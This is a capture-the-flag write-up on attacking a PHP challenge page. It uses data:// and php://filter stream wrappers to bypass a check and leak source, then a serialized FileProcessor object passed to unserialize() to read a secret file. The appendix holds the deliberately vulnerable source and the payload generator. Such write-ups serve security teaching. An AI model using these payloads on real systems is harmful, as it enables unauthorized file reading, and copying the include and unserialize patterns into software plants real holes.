###php vulnarabilities###

###Part1 : Bypass file_get_contents()
	Several ways to trick this function
	method1 : Using data://text/plain 
		http://chall.ctfs.me:8009/index.php?user=data://text/plain,please%20let%20me%20in%20master%20gblq1337 
	method2 : Using php://input

###Part2 : Leak class.php (File is shown below)
	Some sanitization is needed to leak class.php
	method : Using php://filter/convert.base64-encode/resource=[file]
	decode the output

###Part3 : Leak index.php (File is shown below)
	Now it is obvious that class.php is some function that may help echo file content
	Further examination shows index.php does filter file name and prevents direct including secret file name from class.php
	So to get better grasp over what happens in index.php, we leak it in the same way as class.php

###Part4 : Serializing class (Code is shown below)
	Ok, everything is clear, to obtain secret, we must serialize class from class.php
	Finally get flag with :
	http://chall.ctfs.me:8009/index.php?user=data://text/plain,please%20let%20me%20in%20master%20gblq1337&file=index.php&secretword=[serialized input]




###Appendix
	###class.php
		<?php
		    class FileProcessor{
			/**
			 * [$filename variable used to read the content from]
			 * @var [string]
			 * this file maybe help you : Th1S-1S-s3Cr3t-f1le.php
			 */
			public $filename;  
			public function __toString(){  
			    if(isset($this->filename)){  
				echo file_get_contents($this->filename);      
			    }  
			    return "__toString was called!";  
			}  
		    }  
		?> 
 
	###index.php
		<!DOCTYPE HTML>
		<title>Bluesky Dragon</title>
		<head>
		    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">    
		</head>
		<html>
		<body>
		    <img src="dragon.jpg" />
		    <div class="label label-info col-md-12 text-center">
			<?php  
			    $filename = $_GET["file"];  
			    $user = isset($_GET["user"]) ? $_GET["user"] : "hacker";  
			    $secretword = $_GET["secretword"];  
			      
			    if(file_get_contents($user,'r')==="please let me in master gblq1337"){  
				echo "Welcome Back, My Master!!!";  
				if(preg_match("/Th1S-1S-s3Cr3t-f1le/",$filename)){
				    die("Are you hacker???");
				}else{  
				    include($filename); //class.php  
				    $pwd = unserialize($secretword);  
				    echo $pwd;  
				}  
			    }else{  
				echo "<h1>Hey, you didn't supposed to be here, please get out!!!</h1>";  
				echo "Tell me your secret word";
			    }  
			      
			?>
		    </div> 
		</body>
		</html>

		<!--  
		$filename = $_GET["file"];  
		$user = isset($_GET["user"]) ? $_GET["user"] : "hacker";  
		$secretword = $_GET["secretword"];  
		  
		if(file_get_contents($user,'r')==="please let me in master gblq1337"){  
		    echo "Welcome Back, My Master!!!";  
		    include($filename); //class.php  
		}else{  
		    echo "<h1>Hey, you didn't supposed to be here, please get out!!!</h1>";  
		    echo "Tell me your secret word";
		}  
		-->

	###Serialize input
		<?php
		    class FileProcessor{
			/**
			 * [$filename variable used to read the content from]
			 * @var [string]
			 * this file maybe help you : Th1S-1S-s3Cr3t-f1le.php
			 */
			public $filename;
			public function __toString(){
			    if(isset($this->filename)){
				echo file_get_contents($this->filename);
			    }
			    return "__toString was called!";
			}
		    }
		$foo = new FileProcessor();
		$foo->filename = './Th1S-1S-s3Cr3t-f1le.php';
		$a = serialize($foo);
		echo $a;
		?>
